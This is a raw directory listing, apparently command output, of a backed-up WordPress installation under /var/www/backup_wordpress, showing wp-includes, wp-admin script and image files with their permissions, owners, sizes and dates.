-rw-r--r-- 1 www-data www-data 6234 Feb 23  2016 /var/www/backup_wordpress/wp-includes/pluggable-deprecated.php
-rw-r--r-- 1 www-data www-data 90465 Sep 19  2015 /var/www/backup_wordpress/wp-includes/class-simplepie.php
-rw-r--r-- 1 www-data www-data 18879 Jan  8  2016 /var/www/backup_wordpress/wp-includes/feed.php
-rw-r--r-- 1 www-data www-data 3031 Nov  4  2015 /var/www/backup_wordpress/wp-includes/feed-atom.php
-rw-r--r-- 1 www-data www-data 48091 Feb 25  2016 /var/www/backup_wordpress/wp-includes/widgets.php
-rw-r--r-- 1 www-data www-data 6435 Sep  2  2015 /var/www/backup_wordpress/wp-includes/class-wp-http-encoding.php
-rw-r--r-- 1 www-data www-data 1188 Oct 20  2015 /var/www/backup_wordpress/wp-includes/feed-rss.php
-rw-r--r-- 1 www-data www-data 3094 Oct  8  2015 /var/www/backup_wordpress/wp-includes/class-wp-http-response.php
-rw-r--r-- 1 www-data www-data 5956 Jan 27  2016 /var/www/backup_wordpress/wp-includes/class-wp-http-proxy.php
-rw-r--r-- 1 www-data www-data 19398 Dec 25  2015 /var/www/backup_wordpress/wp-includes/shortcodes.php
-rw-r--r-- 1 www-data www-data 26527 Mar 23  2016 /var/www/backup_wordpress/wp-includes/class-oembed.php
-rw-r--r-- 1 www-data www-data 17217 Mar 12  2016 /var/www/backup_wordpress/wp-includes/rewrite.php
-rw-r--r-- 1 www-data www-data 7898 Mar 14  2016 /var/www/backup_wordpress/wp-includes/functions.wp-styles.php
-rw-r--r-- 1 www-data www-data 22110 Feb 25  2016 /var/www/backup_wordpress/wp-includes/cache.php
-rw-r--r-- 1 www-data www-data 13142 Mar 14  2016 /var/www/backup_wordpress/wp-includes/class.wp-dependencies.php
-rw-r--r-- 1 www-data www-data 33148 Feb 27  2016 /var/www/backup_wordpress/wp-includes/class-http.php
-rw-r--r-- 1 www-data www-data 95481 Mar 12  2016 /var/www/backup_wordpress/wp-includes/comment.php
-rw-r--r-- 1 www-data www-data 22546 Feb 26  2016 /var/www/backup_wordpress/wp-includes/class-wp-meta-query.php
-rw-r--r-- 1 www-data www-data 3744 Nov  4  2015 /var/www/backup_wordpress/wp-includes/feed-rss2.php
-rw-r--r-- 1 www-data www-data 132266 Mar 18  2016 /var/www/backup_wordpress/wp-includes/media.php
-rw-r--r-- 1 www-data www-data 63806 Apr  7  2016 /var/www/backup_wordpress/wp-includes/class-wp-customize-widgets.php
-rw-r--r-- 1 www-data www-data 65754 Mar 23  2016 /var/www/backup_wordpress/wp-includes/class-wp-customize-manager.php
-rw-r--r-- 1 www-data www-data 10172 Mar  6  2016 /var/www/backup_wordpress/wp-includes/class.wp-styles.php
-rw-r--r-- 1 www-data www-data 13339 Dec 18  2015 /var/www/backup_wordpress/wp-includes/bookmark.php
-rw-r--r-- 1 www-data www-data 40472 Dec  6  2015 /var/www/backup_wordpress/wp-includes/class-json.php
-rw-r--r-- 1 www-data www-data 32946 Mar  8  2016 /var/www/backup_wordpress/wp-includes/nav-menu.php
-rw-r--r-- 1 www-data www-data 43638 Feb 26  2016 /var/www/backup_wordpress/wp-includes/class-wp-theme.php
-rw-r--r-- 1 www-data www-data 26209 Jan 27  2016 /var/www/backup_wordpress/wp-includes/class-wp-user-query.php
-rw-r--r-- 1 www-data www-data 3061 Oct  2  2015 /var/www/backup_wordpress/xmlrpc.php
-rw-r--r-- 1 www-data www-data 3129 Sep 10  2015 /var/www/backup_wordpress/wp-admin/media-new.php
-rw-r--r-- 1 www-data www-data 44815 Feb 23  2016 /var/www/backup_wordpress/wp-admin/custom-header.php
-rw-r--r-- 1 www-data www-data 13136 Mar 30  2016 /var/www/backup_wordpress/wp-admin/theme-install.php
-rw-r--r-- 1 www-data www-data 492 Mar  1  2013 /var/www/backup_wordpress/wp-admin/options-head.php
-rw-r--r-- 1 www-data www-data 712 Sep 24  2013 /var/www/backup_wordpress/wp-admin/link-add.php
-rw-r--r-- 1 www-data www-data 231 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-edit.php
-rw-r--r-- 1 www-data www-data 4962 Oct 20  2015 /var/www/backup_wordpress/wp-admin/js/tags-box.js
-rw-r--r-- 1 www-data www-data 22770 Mar 30  2016 /var/www/backup_wordpress/wp-admin/js/theme.min.js
-rw-r--r-- 1 www-data www-data 2314 Nov 14  2013 /var/www/backup_wordpress/wp-admin/js/password-strength-meter.js
-rw-r--r-- 1 www-data www-data 17199 Jan  8  2016 /var/www/backup_wordpress/wp-admin/js/image-edit.js
-rw-r--r-- 1 www-data www-data 6027 Dec 11  2015 /var/www/backup_wordpress/wp-admin/js/user-profile.min.js
-rw-r--r-- 1 www-data www-data 900 Jan 28  2014 /var/www/backup_wordpress/wp-admin/js/custom-background.min.js
-rw-r--r-- 1 www-data www-data 525 May 31  2015 /var/www/backup_wordpress/wp-admin/js/set-post-thumbnail.min.js
-rw-r--r-- 1 www-data www-data 88171 Mar  9  2016 /var/www/backup_wordpress/wp-admin/js/customize-nav-menus.js
-rw-r--r-- 1 www-data www-data 45239 Apr  7  2016 /var/www/backup_wordpress/wp-admin/js/customize-controls.min.js
-rw-r--r-- 1 www-data www-data 11498 Dec 11  2015 /var/www/backup_wordpress/wp-admin/js/user-profile.js
-rw-r--r-- 1 www-data www-data 679 Jan 27  2014 /var/www/backup_wordpress/wp-admin/js/user-suggest.min.js
-rw-r--r-- 1 www-data www-data 14289 Feb 28  2016 /var/www/backup_wordpress/wp-admin/js/edit-comments.min.js
-rw-r--r-- 1 www-data www-data 2034 Jul 25  2015 /var/www/backup_wordpress/wp-admin/js/comment.js
-rw-r--r-- 1 www-data www-data 2749 Jan 14  2016 /var/www/backup_wordpress/wp-admin/js/inline-edit-tax.min.js
-rw-r--r-- 1 www-data www-data 2753 Oct 12  2015 /var/www/backup_wordpress/wp-admin/js/color-picker.min.js
-rw-r--r-- 1 www-data www-data 1502 Nov 13  2013 /var/www/backup_wordpress/wp-admin/js/custom-header.js
-rw-r--r-- 1 www-data www-data 2048 Mar 10  2016 /var/www/backup_wordpress/wp-admin/js/plugin-install.min.js
-rw-r--r-- 1 www-data www-data 3815 Oct  8  2015 /var/www/backup_wordpress/wp-admin/js/gallery.min.js
-rw-r--r-- 1 www-data www-data 1646 Nov 13  2013 /var/www/backup_wordpress/wp-admin/js/link.min.js
-rw-r--r-- 1 www-data www-data 25774 Nov  7  2015 /var/www/backup_wordpress/wp-admin/js/press-this.js
-rw-r--r-- 1 www-data www-data 47391 Mar 30  2016 /var/www/backup_wordpress/wp-admin/js/theme.js
-rw-r--r-- 1 www-data www-data 537 Nov 13  2013 /var/www/backup_wordpress/wp-admin/js/media-gallery.min.js
-rw-r--r-- 1 www-data www-data 1984 Jan 13  2016 /var/www/backup_wordpress/wp-admin/js/media-upload.js
-rw-r--r-- 1 www-data www-data 625 Aug  4  2014 /var/www/backup_wordpress/wp-admin/js/language-chooser.js
-rw-r--r-- 1 www-data www-data 331 Jun  1  2015 /var/www/backup_wordpress/wp-admin/js/wp-fullscreen-stub.min.js
-rw-r--r-- 1 www-data www-data 7388 Jan 21  2016 /var/www/backup_wordpress/wp-admin/js/inline-edit-post.min.js
-rw-r--r-- 1 www-data www-data 1508 Jul 27  2015 /var/www/backup_wordpress/wp-admin/js/word-count.min.js
-rw-r--r-- 1 www-data www-data 26810 Feb 28  2016 /var/www/backup_wordpress/wp-admin/js/edit-comments.js
-rw-r--r-- 1 www-data www-data 2410 Jun 28  2015 /var/www/backup_wordpress/wp-admin/js/svg-painter.min.js
-rw-r--r-- 1 www-data www-data 34603 Mar 15  2016 /var/www/backup_wordpress/wp-admin/js/editor-expand.js
-rw-r--r-- 1 www-data www-data 1819 Apr  2  2015 /var/www/backup_wordpress/wp-admin/js/media.min.js
-rw-r--r-- 1 www-data www-data 13402 Jan 22  2016 /var/www/backup_wordpress/wp-admin/js/common.min.js
-rw-r--r-- 1 www-data www-data 9176 Feb 17  2016 /var/www/backup_wordpress/wp-admin/js/updates.min.js
-rw-r--r-- 1 www-data www-data 4158 Jan 13  2016 /var/www/backup_wordpress/wp-admin/js/postbox.min.js
-rw-r--r-- 1 www-data www-data 108418 Apr  7  2016 /var/www/backup_wordpress/wp-admin/js/customize-controls.js
-rw-r--r-- 1 www-data www-data 441 Nov 14  2013 /var/www/backup_wordpress/wp-admin/js/xfn.min.js
-rw-r--r-- 1 www-data www-data 40069 Mar  9  2016 /var/www/backup_wordpress/wp-admin/js/customize-nav-menus.min.js
-rw-r--r-- 1 www-data www-data 11593 Dec 17  2015 /var/www/backup_wordpress/wp-admin/js/editor.js
-rw-r--r-- 1 www-data www-data 22307 Nov 30  2014 /var/www/backup_wordpress/wp-admin/js/iris.min.js
-rw-r--r-- 1 www-data www-data 1247 Jul 25  2015 /var/www/backup_wordpress/wp-admin/js/comment.min.js
-rw-r--r-- 1 www-data www-data 6923 Jan 14  2016 /var/www/backup_wordpress/wp-admin/js/postbox.js
-rw-r--r-- 1 www-data www-data 20854 Feb 11  2016 /var/www/backup_wordpress/wp-admin/js/nav-menu.min.js
-rw-r--r-- 1 www-data www-data 29772 Mar 12  2016 /var/www/backup_wordpress/wp-admin/js/post.js
-rw-r--r-- 1 www-data www-data 7689 Nov 11  2010 /var/www/backup_wordpress/wp-admin/js/farbtastic.js
-rw-r--r-- 1 www-data www-data 685 Jun  1  2015 /var/www/backup_wordpress/wp-admin/js/wp-fullscreen-stub.js
-rw-r--r-- 1 www-data www-data 2809 Apr  2  2015 /var/www/backup_wordpress/wp-admin/js/media.js
-rw-r--r-- 1 www-data www-data 4359 Jan 14  2016 /var/www/backup_wordpress/wp-admin/js/inline-edit-tax.js
-rw-r--r-- 1 www-data www-data 4789 Oct 12  2015 /var/www/backup_wordpress/wp-admin/js/color-picker.js
-rw-r--r-- 1 www-data www-data 1153 Jan 13  2016 /var/www/backup_wordpress/wp-admin/js/media-upload.min.js
-rw-r--r-- 1 www-data www-data 837 Jul 29  2015 /var/www/backup_wordpress/wp-admin/js/accordion.min.js
-rw-r--r-- 1 www-data www-data 777 May 31  2015 /var/www/backup_wordpress/wp-admin/js/set-post-thumbnail.js
-rw-r--r-- 1 www-data www-data 17122 Oct 20  2015 /var/www/backup_wordpress/wp-admin/js/widgets.js
-rw-r--r-- 1 www-data www-data 1874 Nov 13  2013 /var/www/backup_wordpress/wp-admin/js/custom-background.js
-rw-r--r-- 1 www-data www-data 11475 Nov  7  2015 /var/www/backup_wordpress/wp-admin/js/press-this.min.js
-rw-r--r-- 1 www-data www-data 40963 Mar 10  2016 /var/www/backup_wordpress/wp-admin/js/nav-menu.js
-rw-r--r-- 1 www-data www-data 17788 Mar 12  2016 /var/www/backup_wordpress/wp-admin/js/post.min.js
-rw-r--r-- 1 www-data www-data 33679 Feb 25  2016 /var/www/backup_wordpress/wp-admin/js/revisions.js
-rw-r--r-- 1 www-data www-data 769 Nov 15  2013 /var/www/backup_wordpress/wp-admin/js/media-gallery.js
-rw-r--r-- 1 www-data www-data 374 Aug  4  2014 /var/www/backup_wordpress/wp-admin/js/language-chooser.min.js
-rw-r--r-- 1 www-data www-data 1070 Jan 27  2014 /var/www/backup_wordpress/wp-admin/js/user-suggest.js
-rw-r--r-- 1 www-data www-data 17301 Feb 17  2016 /var/www/backup_wordpress/wp-admin/js/updates.js
-rw-r--r-- 1 www-data www-data 2057 Jun 17  2015 /var/www/backup_wordpress/wp-admin/js/bookmarklet.min.js
-rw-r--r-- 1 www-data www-data 64815 Mar 21  2016 /var/www/backup_wordpress/wp-admin/js/customize-widgets.js
-rw-r--r-- 1 www-data www-data 3059 Jul 27  2015 /var/www/backup_wordpress/wp-admin/js/word-count.js
-rw-r--r-- 1 www-data www-data 2717 Oct 20  2015 /var/www/backup_wordpress/wp-admin/js/tags-box.min.js
-rw-r--r-- 1 www-data www-data 2247 Nov 14  2013 /var/www/backup_wordpress/wp-admin/js/link.js
-rw-r--r-- 1 www-data www-data 1574 Mar 12  2015 /var/www/backup_wordpress/wp-admin/js/tags.min.js
-rw-r--r-- 1 www-data www-data 5484 Dec  5  2013 /var/www/backup_wordpress/wp-admin/js/svg-painter.js
-rw-r--r-- 1 www-data www-data 628 Nov 14  2013 /var/www/backup_wordpress/wp-admin/js/xfn.js
-rw-r--r-- 1 www-data www-data 13968 Mar 15  2016 /var/www/backup_wordpress/wp-admin/js/editor-expand.min.js
-rw-r--r-- 1 www-data www-data 25870 Jan 22  2016 /var/www/backup_wordpress/wp-admin/js/common.js
-rw-r--r-- 1 www-data www-data 9573 Jan  8  2016 /var/www/backup_wordpress/wp-admin/js/image-edit.min.js
-rw-r--r-- 1 www-data www-data 26519 Mar 21  2016 /var/www/backup_wordpress/wp-admin/js/customize-widgets.min.js
-rw-r--r-- 1 www-data www-data 5550 Oct  8  2015 /var/www/backup_wordpress/wp-admin/js/gallery.js
-rw-r--r-- 1 www-data www-data 6300 Dec 17  2015 /var/www/backup_wordpress/wp-admin/js/editor.min.js
-rw-r--r-- 1 www-data www-data 5368 Mar 10  2016 /var/www/backup_wordpress/wp-admin/js/plugin-install.js
-rw-r--r-- 1 www-data www-data 11601 Jan 21  2016 /var/www/backup_wordpress/wp-admin/js/inline-edit-post.js
-rw-r--r-- 1 www-data www-data 17884 Jun 28  2015 /var/www/backup_wordpress/wp-admin/js/revisions.min.js
-rw-r--r-- 1 www-data www-data 2918 Jul 29  2015 /var/www/backup_wordpress/wp-admin/js/accordion.js
-rw-r--r-- 1 www-data www-data 737 Nov 14  2013 /var/www/backup_wordpress/wp-admin/js/password-strength-meter.min.js
-rw-r--r-- 1 www-data www-data 9992 Oct 20  2015 /var/www/backup_wordpress/wp-admin/js/widgets.min.js
-rw-r--r-- 1 www-data www-data 5790 Oct  8  2015 /var/www/backup_wordpress/wp-admin/js/dashboard.js
-rw-r--r-- 1 www-data www-data 3218 Oct  8  2015 /var/www/backup_wordpress/wp-admin/js/dashboard.min.js
-rw-r--r-- 1 www-data www-data 2592 Mar 12  2015 /var/www/backup_wordpress/wp-admin/js/tags.js
-rw-r--r-- 1 www-data www-data 3957 Jun 17  2015 /var/www/backup_wordpress/wp-admin/js/bookmarklet.js
-rw-r--r-- 1 www-data www-data 3307 Sep  2  2015 /var/www/backup_wordpress/wp-admin/media-upload.php
-rw-r--r-- 1 www-data www-data 12930 Mar 14  2016 /var/www/backup_wordpress/wp-admin/upload.php
-rw-r--r-- 1 www-data www-data 15408 Feb 23  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-filesystem-ssh2.php
-rw-r--r-- 1 www-data www-data 15813 Oct 17  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-users-list-table.php
-rw-r--r-- 1 www-data www-data 4661 Oct 14  2015 /var/www/backup_wordpress/wp-admin/includes/admin-filters.php
-rw-r--r-- 1 www-data www-data 17960 Oct 22  2015 /var/www/backup_wordpress/wp-admin/includes/continents-cities.php
-rw-r--r-- 1 www-data www-data 6290 Dec 15  2015 /var/www/backup_wordpress/wp-admin/includes/theme-install.php
-rw-r--r-- 1 www-data www-data 5965 Jan  2  2016 /var/www/backup_wordpress/wp-admin/includes/screen.php
-rw-r--r-- 1 www-data www-data 15860 Feb 23  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-ms-sites-list-table.php
-rw-r--r-- 1 www-data www-data 11795 Sep  9  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-filesystem-direct.php
-rw-r--r-- 1 www-data www-data 38531 Feb 24  2016 /var/www/backup_wordpress/wp-admin/includes/ms.php
-rw-r--r-- 1 www-data www-data 2862 Oct 27  2015 /var/www/backup_wordpress/wp-admin/includes/ms-deprecated.php
-rw-r--r-- 1 www-data www-data 88433 Mar 13  2016 /var/www/backup_wordpress/wp-admin/includes/upgrade.php
-rw-r--r-- 1 www-data www-data 17000 Mar 22  2016 /var/www/backup_wordpress/wp-admin/includes/user.php
-rw-r--r-- 1 www-data www-data 19205 Oct 14  2015 /var/www/backup_wordpress/wp-admin/includes/export.php
-rw-r--r-- 1 www-data www-data 34295 Mar  7  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-screen.php
-rw-r--r-- 1 www-data www-data 49792 Mar 16  2016 /var/www/backup_wordpress/wp-admin/includes/meta-boxes.php
-rw-r--r-- 1 www-data www-data 34967 Jan 27  2016 /var/www/backup_wordpress/wp-admin/includes/deprecated.php
-rw-r--r-- 1 www-data www-data 8724 Oct 28  2015 /var/www/backup_wordpress/wp-admin/includes/menu.php
-rw-r--r-- 1 www-data www-data 22416 Mar  8  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-media-list-table.php
-rw-r--r-- 1 www-data www-data 38420 Dec  7  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-list-table.php
-rw-r--r-- 1 www-data www-data 123835 Mar 14  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-upgrader.php
-rw-r--r-- 1 www-data www-data 29492 Dec 10  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-upgrader-skins.php
-rw-r--r-- 1 www-data www-data 16903 Mar 30  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-plugin-install-list-table.php
-rw-r--r-- 1 www-data www-data 25859 Feb 12  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-comments-list-table.php
-rw-r--r-- 1 www-data www-data 4149 Jan 27  2016 /var/www/backup_wordpress/wp-admin/includes/options.php
-rw-r--r-- 1 www-data www-data 14030 Dec 14  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php
-rw-r--r-- 1 www-data www-data 14660 Feb 25  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-theme-install-list-table.php
-rw-r--r-- 1 www-data www-data 8518 Sep 18  2015 /var/www/backup_wordpress/wp-admin/includes/class-ftp-sockets.php
-rw-r--r-- 1 www-data www-data 92656 Mar 30  2016 /var/www/backup_wordpress/wp-admin/includes/ajax-actions.php
-rw-r--r-- 1 www-data www-data 67625 Mar  3  2016 /var/www/backup_wordpress/wp-admin/includes/plugin.php
-rw-r--r-- 1 www-data www-data 5472 Sep 18  2015 /var/www/backup_wordpress/wp-admin/includes/class-ftp-pure.php
-rw-r--r-- 1 www-data www-data 50550 Mar  9  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-posts-list-table.php
-rw-r--r-- 1 www-data www-data 49695 Mar 12  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-press-this.php
-rw-r--r-- 1 www-data www-data 19673 Mar 10  2016 /var/www/backup_wordpress/wp-admin/includes/update.php
-rw-r--r-- 1 www-data www-data 19841 Jan 25  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-ms-themes-list-table.php
-rw-r--r-- 1 www-data www-data 30022 Apr  2  2016 /var/www/backup_wordpress/wp-admin/includes/plugin-install.php
-rw-r--r-- 1 www-data www-data 7698 Dec 16  2015 /var/www/backup_wordpress/wp-admin/includes/taxonomy.php
-rw-r--r-- 1 www-data www-data 2872 Mar  9  2016 /var/www/backup_wordpress/wp-admin/includes/admin.php
-rw-r--r-- 1 www-data www-data 1970 Dec 22  2015 /var/www/backup_wordpress/wp-admin/includes/credits.php
-rw-r--r-- 1 www-data www-data 1083 Sep 10  2015 /var/www/backup_wordpress/wp-admin/includes/noop.php
-rw-r--r-- 1 www-data www-data 58630 Mar  9  2016 /var/www/backup_wordpress/wp-admin/includes/post.php
-rw-r--r-- 1 www-data www-data 52036 Mar  3  2016 /var/www/backup_wordpress/wp-admin/includes/update-core.php
-rw-r--r-- 1 www-data www-data 4319 Sep 22  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-internal-pointers.php
-rw-r--r-- 1 www-data www-data 4194 Sep 22  2015 /var/www/backup_wordpress/wp-admin/includes/class-walker-category-checklist.php
-rw-r--r-- 1 www-data www-data 32458 Jan  8  2016 /var/www/backup_wordpress/wp-admin/includes/image-edit.php
-rw-r--r-- 1 www-data www-data 26681 Mar  4  2016 /var/www/backup_wordpress/wp-admin/includes/theme.php
-rw-r--r-- 1 www-data www-data 26032 Feb 19  2016 /var/www/backup_wordpress/wp-admin/includes/misc.php
-rw-r--r-- 1 www-data www-data 1410 Sep 15  2015 /var/www/backup_wordpress/wp-admin/includes/edit-tag-messages.php
-rw-r--r-- 1 www-data www-data 14941 Feb 23  2016 /var/www/backup_wordpress/wp-admin/includes/revision.php
-rw-r--r-- 1 www-data www-data 11013 Mar 30  2016 /var/www/backup_wordpress/wp-admin/includes/class-walker-nav-menu-edit.php
-rw-r--r-- 1 www-data www-data 7224 Oct 14  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-importer.php
-rw-r--r-- 1 www-data www-data 52329 Mar 10  2016 /var/www/backup_wordpress/wp-admin/includes/dashboard.php
-rw-r--r-- 1 www-data www-data 1289 Feb  7  2016 /var/www/backup_wordpress/wp-admin/includes/ms-admin-filters.php
-rw-r--r-- 1 www-data www-data 17906 Jan 11  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-terms-list-table.php
-rw-r--r-- 1 www-data www-data 6304 Oct 20  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-site-icon.php
-rw-r--r-- 1 www-data www-data 12593 Feb 18  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-ms-users-list-table.php
-rw-r--r-- 1 www-data www-data 76330 Mar 30  2016 /var/www/backup_wordpress/wp-admin/includes/template.php
-rw-r--r-- 1 www-data www-data 22969 Jan  9  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-filesystem-base.php
-rw-r--r-- 1 www-data www-data 26999 Dec 14  2015 /var/www/backup_wordpress/wp-admin/includes/class-ftp.php
-rw-r--r-- 1 www-data www-data 9376 Oct 17  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-themes-list-table.php
-rw-r--r-- 1 www-data www-data 23183 Feb 24  2016 /var/www/backup_wordpress/wp-admin/includes/network.php
-rw-r--r-- 1 www-data www-data 4926 Oct 15  2015 /var/www/backup_wordpress/wp-admin/includes/class-walker-nav-menu-checklist.php
-rw-r--r-- 1 www-data www-data 1472 Oct 17  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-post-comments-list-table.php
-rw-r--r-- 1 www-data www-data 7838 Mar  2  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-links-list-table.php
-rw-r--r-- 1 www-data www-data 9500 Oct 10  2015 /var/www/backup_wordpress/wp-admin/includes/widgets.php
-rw-r--r-- 1 www-data www-data 19660 Mar 12  2016 /var/www/backup_wordpress/wp-admin/includes/image.php
-rw-r--r-- 1 www-data www-data 11107 Dec 14  2015 /var/www/backup_wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php
-rw-r--r-- 1 www-data www-data 8242 Oct  5  2015 /var/www/backup_wordpress/wp-admin/includes/translation-install.php
-rw-r--r-- 1 www-data www-data 31305 Mar 10  2016 /var/www/backup_wordpress/wp-admin/includes/class-wp-plugins-list-table.php
-rw-r--r-- 1 www-data www-data 6331 Sep 25  2015 /var/www/backup_wordpress/wp-admin/includes/import.php
-rw-r--r-- 1 www-data www-data 5718 Oct 18  2015 /var/www/backup_wordpress/wp-admin/includes/comment.php
-rw-r--r-- 1 www-data www-data 37012 Feb 23  2016 /var/www/backup_wordpress/wp-admin/includes/schema.php
-rw-r--r-- 1 www-data www-data 102273 Mar 18  2016 /var/www/backup_wordpress/wp-admin/includes/media.php
-rw-r--r-- 1 www-data www-data 195702 Jun 28  2015 /var/www/backup_wordpress/wp-admin/includes/class-pclzip.php
-rw-r--r-- 1 www-data www-data 51492 Mar 12  2016 /var/www/backup_wordpress/wp-admin/includes/file.php
-rw-r--r-- 1 www-data www-data 9095 Oct 14  2015 /var/www/backup_wordpress/wp-admin/includes/bookmark.php
-rw-r--r-- 1 www-data www-data 39256 Mar 30  2016 /var/www/backup_wordpress/wp-admin/includes/nav-menu.php
-rw-r--r-- 1 www-data www-data 3612 Jan  8  2016 /var/www/backup_wordpress/wp-admin/includes/list-table.php
-rw-r--r-- 1 www-data www-data 3869 Jul  1  2015 /var/www/backup_wordpress/wp-admin/ms-delete-site.php
-rw-r--r-- 1 www-data www-data 4512 Dec  8  2015 /var/www/backup_wordpress/wp-admin/upgrade.php
-rw-r--r-- 1 www-data www-data 2625 Jul 17  2014 /var/www/backup_wordpress/wp-admin/link.php
-rw-r--r-- 1 www-data www-data 10752 Dec 31  2015 /var/www/backup_wordpress/wp-admin/export.php
-rw-r--r-- 1 www-data www-data 14759 Mar  6  2016 /var/www/backup_wordpress/wp-admin/setup-config.php
-rw-r--r-- 1 www-data www-data 12907 Feb  3  2016 /var/www/backup_wordpress/wp-admin/menu.php
-rw-r--r-- 1 www-data www-data 14218 Oct 21  2015 /var/www/backup_wordpress/wp-admin/options-discussion.php
-rw-r--r-- 1 www-data www-data 232 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-upgrade-network.php
-rw-r--r-- 1 www-data www-data 20721 Feb 24  2016 /var/www/backup_wordpress/wp-admin/user-new.php
-rw-r--r-- 1 www-data www-data 5573 Aug 30  2015 /var/www/backup_wordpress/wp-admin/tools.php
-rw-r--r-- 1 www-data www-data 6028 Oct 14  2015 /var/www/backup_wordpress/wp-admin/edit-link-form.php
-rw-r--r-- 1 www-data www-data 3666 Jan 14  2016 /var/www/backup_wordpress/wp-admin/link-manager.php
-rw-r--r-- 1 www-data www-data 32331 Apr  5  2016 /var/www/backup_wordpress/wp-admin/edit-form-advanced.php
-rw-r--r-- 1 www-data www-data 236 Sep 24  2013 /var/www/backup_wordpress/wp-admin/ms-options.php
-rw-r--r-- 1 www-data www-data 3390 Apr  9  2016 /var/www/backup_wordpress/wp-admin/freedoms.php
-rw-r--r-- 1 www-data www-data 296 Sep 24  2013 /var/www/backup_wordpress/wp-admin/profile.php
-rw-r--r-- 1 www-data www-data 2401 May 28  2015 /var/www/backup_wordpress/wp-admin/admin-footer.php
-rw-r--r-- 1 www-data www-data 11321 Nov 18  2015 /var/www/backup_wordpress/wp-admin/options.php
-rw-r--r-- 1 www-data www-data 11645 Oct 14  2015 /var/www/backup_wordpress/wp-admin/theme-editor.php
-rw-r--r-- 1 www-data www-data 11813 Apr 12  2016 /var/www/backup_wordpress/wp-admin/about.php
-rw-r--r-- 1 www-data www-data 5750 Oct 14  2015 /var/www/backup_wordpress/wp-admin/install-helper.php
-rw-r--r-- 1 www-data www-data 12005 Oct 12  2015 /var/www/backup_wordpress/wp-admin/plugin-editor.php
-rw-r--r-- 1 www-data www-data 25457 Mar 30  2016 /var/www/backup_wordpress/wp-admin/user-edit.php
-rw-r--r-- 1 www-data www-data 9059 Mar 12  2016 /var/www/backup_wordpress/wp-admin/menu-header.php
-rw-r--r-- 1 www-data www-data 996 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/date-button-2x.gif
-rw-r--r-- 1 www-data www-data 863 Sep 26  2012 /var/www/backup_wordpress/wp-admin/images/arrows-2x.png
-rw-r--r-- 1 www-data www-data 9133 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/wpspin_light-2x.gif
-rw-r--r-- 1 www-data www-data 554 Sep 24  2012 /var/www/backup_wordpress/wp-admin/images/align-left.png
-rw-r--r-- 1 www-data www-data 1257 Nov  8  2012 /var/www/backup_wordpress/wp-admin/images/stars-2x.png
-rw-r--r-- 1 www-data www-data 8536 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/spinner-2x.gif
-rw-r--r-- 1 www-data www-data 120 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/se.png
-rw-r--r-- 1 www-data www-data 133 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/media-button-video.gif
-rw-r--r-- 1 www-data www-data 258 Feb 13  2014 /var/www/backup_wordpress/wp-admin/images/comment-grey-bubble-2x.png
-rw-r--r-- 1 www-data www-data 1521 Apr  5  2015 /var/www/backup_wordpress/wp-admin/images/wordpress-logo.svg
-rw-r--r-- 1 www-data www-data 8007 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/icons32-vs.png
-rw-r--r-- 1 www-data www-data 243 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/arrows.png
-rw-r--r-- 1 www-data www-data 7664 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/imgedit-icons-2x.png
-rw-r--r-- 1 www-data www-data 21396 Nov 24  2014 /var/www/backup_wordpress/wp-admin/images/icons32-vs-2x.png
-rw-r--r-- 1 www-data www-data 1639 Mar  9  2016 /var/www/backup_wordpress/wp-admin/images/wordpress-logo-white.svg
-rw-r--r-- 1 www-data www-data 70 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/resize.gif
-rw-r--r-- 1 www-data www-data 2254 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/loading.gif
-rw-r--r-- 1 www-data www-data 121 Sep 26  2012 /var/www/backup_wordpress/wp-admin/images/align-none-2x.png
-rw-r--r-- 1 www-data www-data 546 Sep 24  2012 /var/www/backup_wordpress/wp-admin/images/align-center.png
-rw-r--r-- 1 www-data www-data 5111 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/post-formats32-vs.png
-rw-r--r-- 1 www-data www-data 850 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/media-button-2x.png
-rw-r--r-- 1 www-data www-data 755 Nov  7  2012 /var/www/backup_wordpress/wp-admin/images/no.png
-rw-r--r-- 1 www-data www-data 55 Oct 28  2014 /var/www/backup_wordpress/wp-admin/images/sort.gif
-rw-r--r-- 1 www-data www-data 417 Sep 24  2012 /var/www/backup_wordpress/wp-admin/images/align-none.png
-rw-r--r-- 1 www-data www-data 360 Feb 13  2014 /var/www/backup_wordpress/wp-admin/images/marker.png
-rw-r--r-- 1 www-data www-data 4055 Nov 24  2014 /var/www/backup_wordpress/wp-admin/images/imgedit-icons.png
